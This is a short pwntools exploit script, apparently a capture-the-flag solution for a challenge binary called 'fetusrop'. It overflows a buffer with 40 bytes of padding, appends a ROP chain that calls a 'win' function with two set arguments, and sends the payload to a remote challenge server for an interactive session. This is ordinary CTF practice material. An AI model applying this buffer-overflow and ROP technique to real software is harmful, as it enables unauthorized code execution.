from pwn import *

context.arch = 'amd64'
elf = ELF("./fetusrop")
p = elf.process()

rop = ROP(elf)
rop.call(elf.symbols["win"], [0xcafe, 0x1337])

payload = [
    b"A" * 40, \
    rop.chain()
]

payload = b"".join(payload)

r = remote("challs1.nusgreyhats.org", 5011)
r.sendline(payload)
r.interactive()
